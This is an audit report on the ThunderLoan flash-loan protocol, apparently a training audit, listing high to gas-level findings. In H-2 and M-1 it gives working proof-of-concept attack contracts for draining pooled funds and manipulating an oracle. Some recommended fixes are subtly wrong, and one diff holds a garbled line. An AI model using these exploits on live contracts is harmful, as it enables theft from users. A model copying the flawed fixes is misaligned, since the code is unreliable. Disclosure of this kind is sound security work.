---
title: Codehawks First flight Dussehra Audit Report
author: Seven Cedars
date: June 12, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

<!-- to render report run: 
    pandoc report-formatted.md -o report.pdf --from markdown --template=eisvogel --listings 
NB: remeber to run this in the audit_data folder! 
-->

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries ThunderLoan Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Seven Cedars](https://github.com/7Cedars)
Lead Auditors: Seven Cedars

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)

# Protocol Summary
The ThunderLoan protocol is meant to do the following:

1. Give users a way to create flash loans
2. Give liquidity providers a way to earn money off their capital
   
Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans. 

# Disclaimer

The team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

## Scope 
- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
- In Scope:
```
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```
- Solc Version: 0.8.20
- Chain(s) to deploy contract to: Ethereum
- ERC20s:
  - USDC 
  - DAI
  - LINK
  - WETH

## Roles
- Owner: The owner of the protocol who has the power to upgrade the implementation. 
- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
- User: A user who takes out flash loans from the protocol.
  
# Executive Summary

| Severity | Number of Issues found |
| -------- | ---------------------- |
| high     | 3                      |
| medium   | 2                      |
| low      | 2                      |
| info     | 7                      |
| gas      | 1                      |
| total    | 15                     |


## Issues found
# Findings

## High
### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees that is actually the case, that blocks redemptions and incorrectly sets the exchange rate. 

**Description:** In the `ThunderLoan` protocol, the `exchangeRate` is used to calculate the exchange rate between assetTokens and their underlying tokens. Indirectly, it keeps track of how many fees liquidity providers should receive. 

However, the `deposit` function erroneously updates this state - without collecting any fees. 

```javascript 
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

@>        uint256 calculatedFee = getCalculatedFee(token, amount);
@>        assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts of this bug. 

1. The `redeem` function is potentially blocked because the protocol, bacause it can try to return more tokens than it has. 
2. Rewards are incorrectly calculated, leading to users getting potentially more or less than they deserve. 

**Proof of Concept:**
1. LP depsoits
2. User takes out a flash loan
3. It is now possible for LP to redeem.  

<details>
<summary> Proof of Concept</summary>

Place the following in `ThunderLoanTest.t.sol`

```javascript
     function testRedeemAfterLoan() public  setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max ;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);  
    }
```

</details>

**Recommended Mitigation:** Remove the incorrect update exchange rate lines from `deposit`. 

```diff 
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-        uint256 calculatedFee = getCalculatedFee(token, amount);
-        assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] The `ThunderLoan::deposit` function can be called with borrowed money from `ThunderLoan::flashloan`, allowing draining of all funds through taking fees and exchange rate manipulation.

**Description:** 
It is possible to borrow tokens via the `flashloan` function and desposit them via the `deposit` function; bypassing the `repay` function. It is possible because the protocol checks if the flashloan has been repaid by comparing the start and end balance of the token. This end balance can also be the same by depositing (instead of repaying) the token.   

```javascript
    uint256 endingBalance = token.balanceOf(address(assetToken));
    if (endingBalance < startingBalance + fee) {
        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
    }
```

**Impact:** 
When borrowed tokens are redeposited (instead of repaid) in this way, the value of the `assetToken` linked to the underlying is artifically increased: new `assetToken`s are minted without additional underlying tokens being added to the `ThunderLoan` contract. It results in tokens being drained from the asset pool.

**Proof of Concept:**
1. ThunderLoan has 100e18 of tokenA as asset, with 100e18 `assetToken`s as collateral.    
2. Malicious userZero takes a flashLoan of 50e18 to external contractB. 
3. ContractB deposits the borrowed tokens through the `deposit` function, receiving newly minted `assetToken`s. 
4. This causes the exchange rate between the `assetToken` and the underlying token to increase.
5. ContractB does not call the repay function, but because the ending balance is higher than starting balance; the call does not revert. 
6. Finally, ContractB calls the `redeem` function with the its assetTokens and receives more underlying tokens than were borrowed initially. 

<details>
<summary> Proof of Concept</summary>

Place the following two in `ThunderLoanTest.t.sol`:  

```javascript
    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user); 
        uint256 amountToBorrow = 50e18; 
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan)); 
        tokenA.mint(address(dor), fee); 
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, ""); 
        dor.redeemMoney();
        vm.stopPrank(); 
        
        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee); 
    }
```

As well as: 

```javascript
    contract DepositOverRepay is IFlashLoanReceiver { 
        ThunderLoan thunderLoan; 
        AssetToken assetToken; 
        IERC20 s_token; 

        constructor(address _thunderLoan) {
            thunderLoan = ThunderLoan(_thunderLoan); 
        }

        function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address /*initiator*/,
            bytes calldata /*params*/
        )
            external
            returns (bool)
        {
            s_token = IERC20(token); 
            assetToken = thunderLoan.getAssetFromToken(IERC20(token)); 
            IERC20(token).approve(address(thunderLoan), amount + fee); 
            thunderLoan.deposit(IERC20(token), amount + fee); 
            return true; 
        }

        function redeemMoney() public {
            uint256 amount = assetToken.balanceOf(address(this)); 
            thunderLoan.redeem(s_token, amount); 
        }
    }
```

</details>


**Recommended Mitigation:** the `flashLoan` function needs to check if the `repay` function is called. This can be done by setting `s_currentlyFlashLoaning` to false inside the `repay` function instead of the `flashLoan` function. 

Thus, at the end of `flashloan`: 
```diff
    uint256 endingBalance = token.balanceOf(address(assetToken));
    if (endingBalance < startingBalance + fee) {
        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
    }
-    s_currentlyFlashLoaning[token] = false;

```

And subsequently at `repay`: 
```diff 
    function repay(IERC20 token, uint256 amount) public {
        if (!s_currentlyFlashLoaning[token]) {
            revert ThunderLoan__NotCurrentlyFlashLoaning();
        }
        AssetToken assetToken = s_tokenToAssetToken[token];
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
+       s_currentlyFlashLoaning[token] = false;
    }
```

This will cause the flashLoan to keep open as long as the token has not been actually repaid.

### [H-3] Mixing up variable location causes storage collision in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol.

**Description:** 
`ThunderLoan.sol` has two storage variables in the following order: 

```javascript
    uint256 private s_feePrecision; 
    uint256 private s_flashLoanFee; 
```

However, `ThunderLoanUpgraded.sol` has them in a different order. 

```javascript
    uint256 private s_flashLoanFee;  
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how solidity storage works, after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the position of storage variables, and removing storage variables for constant variables, also breaks storage location. 

**Impact:** 
After the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. As a result, users will pay the wrong fee. Worse, the `s_currentlyFlashLoaning` starts in the wrong stroage slot, breaking the protocol. 

**Proof of Concept:**
1. Initial contract is deployed. 
2. Owner of contract deploys upgrade. 
3. Fee structure breaks.  

<detail> 
<summary> Proof of Concept </summary> 

Place the following in `ThunderLoanTest.t.sol`. 

```javascript
    import { ThunderLoanUpgraded } from  "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

    function testUpgradesBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee(); 
        vm.startPrank(thunderLoan.owner()); 
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), ""); 
        uint256 feeAfterUpgrade = thunderLoan.getFee(); 
        vm.stopPrank(); 

        console2.log("fee before upgrade:", feeBeforeUpgrade);  
        console2.log("fee after upgrade:", feeAfterUpgrade); 

        assert(feeBeforeUpgrade != feeAfterUpgrade); 
    }  
```

You can also see the storage difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`. 
</detail>

**Recommended Mitigation:** If you must remove the storage variable, leave it blank to avoid mixing storage slots.  

```diff 
-    uint256 private s_flashLoanFee; 
-    uint256 public constant FEE_PRECISION = 1e18;
+    int256 private s_blank;
+    int256 private s_flashLoanFee;
+    uint256 public constant FEE_PRECISION = 1e18;

```

## Medium 

### [M-1] Using Tswap as price Oracle allows for Oracle manipulation and to users being able to get lower borrowing fees. 

**Description:** At `getCalculatedFee` the fee is calculated in wrappedEthed (Weth), using the `TSwap` protocol as price Oracle. However, the exchange rate at `TSwap` can be manipulated by adding (borrowed) tokens to the `Tswap` exchange pool.  

**Impact:** As the exchange rate at the `TSwap` protocol is artifically decreased, a user will pay lower fees for their flashloan.  

**Proof of Concept:**
1. Malicious user takes out a first flashLoan of TokenA. 
2. The user deposits the flashloan to the `Tswap` protocol. 
3. Malicious user takes out a second flashloan of TokanA. 
4. The user pays far lower fees for the second flashloan.   
5. On average the user paid lower fees than they would other wise have. 

<detail> 
<summary> Proof of Concept </summary> 

Place the following code in `ThunderLoanTest.t.sol`.

```javascript
    function testOracleManipulation() public {
        thunderLoan = new ThunderLoan(); 
        tokenA = new ERC20Mock(); 
        proxy = new ERC1967Proxy(address(thunderLoan), ""); 
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth)); 
        address tswapPool = pf.createPool(address(tokenA)); 

        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf)); 

        // 2. fund tswap
        vm.startPrank(liquidityProvider); 
        tokenA.mint(liquidityProvider, 100e18); 
        tokenA.approve(address(tswapPool), 100e18); 
        weth.mint(liquidityProvider, 100e18); 
        weth.approve(address(tswapPool), 100e18); 
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp); 
        vm.stopPrank();
        // ratio = 1 to 1. 

        // 3. fund Thunderloan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true); 
        
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18); 
        tokenA.approve(address(thunderLoan), 1000e18); 
        thunderLoan.deposit(tokenA, 1000e18); 
        vm.stopPrank();

        // 4. get two flashloans. 
        //     a. to influence price of weth/tokenA on Tswap 
        //     b. to show that doing this results in reduced fees on thunderloan. 
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18); 
        console2.log("normal fee is: ", normalFeeCost); 
        //0.296147410319118389 

        uint256 amountToBorrow = 50e18; 
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tswapPool), 
            address(thunderLoan),
            address(thunderLoan.getAssetFromToken(tokenA)) 
        );

        vm.startPrank(user); 
        tokenA.mint(address(flr), 100e18); 
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, ""); 
        vm.stopPrank(); 

        uint256 attackFee = flr.feeOne() + flr.feeTwo(); 
        console2.log("attack fee is:", attackFee); 

        assert(attackFee < normalFeeCost); 
    }
```

As well as the attack contract: 

```javascript
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver { 
    ThunderLoan thunderLoan; 
    address repayAddress; 
    BuffMockTSwap tswapPool; 
    bool attacked; 
    uint256 public feeOne; 
    uint256 public feeTwo; 

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool); 
        thunderLoan = ThunderLoan(_thunderLoan); 
        repayAddress = _repayAddress; 
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            feeOne = fee;
            attacked = true; 
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18); 
            IERC20(token).approve(address(tswapPool), 50e18); 
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp); 
            // this tanks the price. 

            // now getting a second flashloan. 
            thunderLoan.flashloan(address(this), IERC20(token), amount, ""); 
            // repay
            // IERC20(token).approve(address(thunderLoan), amount + fee); 
            // thunderLoan.repay(IERC20(token), amount + fee); 
            IERC20(token).transfer(address(repayAddress), amount + fee); 

        } else {
            // calculate fee -> to compare with previous fee. 
            feeTwo = fee; 
            // repay
            // IERC20(token).approve(address(thunderLoan), amount + fee); 
            // thunderLoan.repay(IERC20(token), amount + fee); 
            IERC20(token).transfer(address(repayAddress), amount + fee); 
        }
        return true; 
    }
}

```

</detail>

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. This will involve some considerable refactoring of the code base. 

### [M-2] `ThunderLoan::getCalculatedFee` calculates the fee in weth, but subsequently combines it with token amounts in payments. It results in users paying incorrect fees. 

**Description:** The `getCalculatedFee` function calculates fees in weth: 

```javascript
    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
```

However, this fee is collected as a token - not as weth - in the `flashloan` function: 
```javascript
    if (endingBalance < startingBalance + fee) {
        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
    }
```

**Impact:** The fees paid by users will be incorrect any time the exchange rate between weth and the token is not 1 to 1.  

**Recommended Mitigation:** Remove calculation of fees in weth. Have users pay their fees in the token that is borrowed. This also resolves any issues with price manipulation mentioned in issue [M-1] discussed above.

## Low 
### [L-1]: Centralization Risk for trusted owners

The protocol restricts function by owner: giving a single owner privileged rights to perform admin tasks. As a consequence, the owner needs to be trusted to not perform malicious updates or drain funds.

<details><summary>6 Found Instances</summary>
- Found in src/protocol/ThunderLoan.sol [Line: 264](src/protocol/ThunderLoan.sol#L264)

	```javascript
	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 299](src/protocol/ThunderLoan.sol#L299)

	```javascript
	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 329](src/protocol/ThunderLoan.sol#L329)

	```javascript
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 238](src/upgradedProtocol/ThunderLoanUpgraded.sol#L238)

	```javascript
	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 264](src/upgradedProtocol/ThunderLoanUpgraded.sol#L264)

	```javascript
	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 287](src/upgradedProtocol/ThunderLoanUpgraded.sol#L287)

	```javascript
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

</details>

### [L-2]: Initialisation can be front run. 

**Description:** By front running the initialise function, someone other than the deployer of the contract can initialize the contract. 

**Impact:** An unintended (malicious) user can take ownership of the contract at initialisation.  

**Recommended Mitigation:** Deploy and initialise through the same function. This is currently already done in the [DeployThunderLoan] script.


## Informational 

### [I-1]: `public` functions not used internally could be marked `external`

Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

<details><summary>6 Found Instances</summary>
- Found in src/protocol/ThunderLoan.sol [Line: 254](src/protocol/ThunderLoan.sol#L254)

	```javascript
	    function repay(IERC20 token, uint256 amount) public {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 313](src/protocol/ThunderLoan.sol#L313)

	```javascript
	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 317](src/protocol/ThunderLoan.sol#L317)

	```javascript
	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 230](src/upgradedProtocol/ThunderLoanUpgraded.sol#L230)

	```javascript
	    function repay(IERC20 token, uint256 amount) public {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 275](src/upgradedProtocol/ThunderLoanUpgraded.sol#L275)

	```javascript
	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 279](src/upgradedProtocol/ThunderLoanUpgraded.sol#L279)

	```javascript
	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
	```
</details>

### [I-2]: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>1 Found Instances</summary>


- Found in src/protocol/OracleUpgradeable.sol [Line: 17](src/protocol/OracleUpgradeable.sol#L17)

	```javascript
	        s_poolFactory = poolFactoryAddress;
	```

</details>

### [I-3]: functions should emit an event what state variables are changed. Some of these events are missing. 

Check for `address(0)` when assigning values to address state variables.

<details><summary>1 Found Instances</summary>

- Found in src/protocol/OracleUpgradeable.sol [Line: 304](src/protocol/ThunderLoan.sol#L304)

	```javascript
	       s_flashLoanFee = newFee;
	```

</details>

### [I-4]: It is considered bad practice to change live code to improve testing. Remove and adapt testing files accordingly. 

**Description:**  `IFlashLoanReceiver.sol` includes an unused import of `IThunderLoan`. This import is used solely in the `MockFlashLoanReceiver.sol` test file. 

**Recommended Mitigation:** Remove import from `IFlashLoanReceiver.sol` and adapt `MockFlashLoanReceiver.sol`. 

At `IFlashLoanReceiver.sol` : 
```diff 
-   import { IThunderLoan } from "./IThunderLoan.sol";
```

At `MockFlashLoanReceiver.sol` : 
```diff 
-   import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
+   import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
+   import { IThunderLoan } from "../../src/interfaces/IThunderLoan.sol";

```

### [I-5]: Input parameters of `IThunderLoan::repay` differ from `ThunderLoan::repay` repay. 

**Description:**  `IThunderLoan::repay` takes an `address` for the `token` field, while `ThunderLoan::repay` takes an `ERC20` for the token field. 

**Recommended Mitigation:** Use `ERC20` in both cases. Adapt the `IThunderLoan::repay` function. Adjust any (test) files accordingly. 

### [I-6]: State variable that remain unchanged should be immutable or constant. 

**Description:** `ThunderLoan::s_feePrecision` is set at initialisation, but never changed afterwards. 

**Recommended Mitigation:** Change `s_feePrecision` to immutable or, possibly, to a constant. 

### [I-7]: Functions are missing natspecs. Please add.   

**Description:** Almost all functions do not have natspecs. 

**impact** Missing natspecs makes code less readable and increases the chance of inadvertently introducing vulnerabilities.

**Recommended Mitigation:** Add natspecs throughout. 

## Gas
### [G-1]: `AssetToken.sol::updateExchangeRate` reads from storage multiple times, using gas. 

**Description:** `AssetToken.sol::updateExchangeRate` reads from storage multiple times, each time using quite a bit of gas. 

```javascript
@>    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();

@>    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;
@>    emit ExchangeRateUpdated(s_exchangeRate);
```

**Recommended Mitigation:** This can be mitigated by creating a temporary variable in the function, and using this temporary variable to calculate the exchange rate.  This means the function only reads from storage once instead of three times. 

```diff
+    uint256 rate = s_exchangeRate; 

-    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
+    uint256 newExchangeRate = rate * (totalSupply() + fee) / totalSupply();

-    if (newExchangeRate <= ras_exchangeRatete) {
-        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
+    if (newExchangeRate <= rate) {
+        revert AssetToken__ExhangeRateCanOnlyIncrease(rate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;
-    emit ExchangeRateUpdated(s_exchangeRate);
+    emit ExchangeRateUpdated(rate);

```
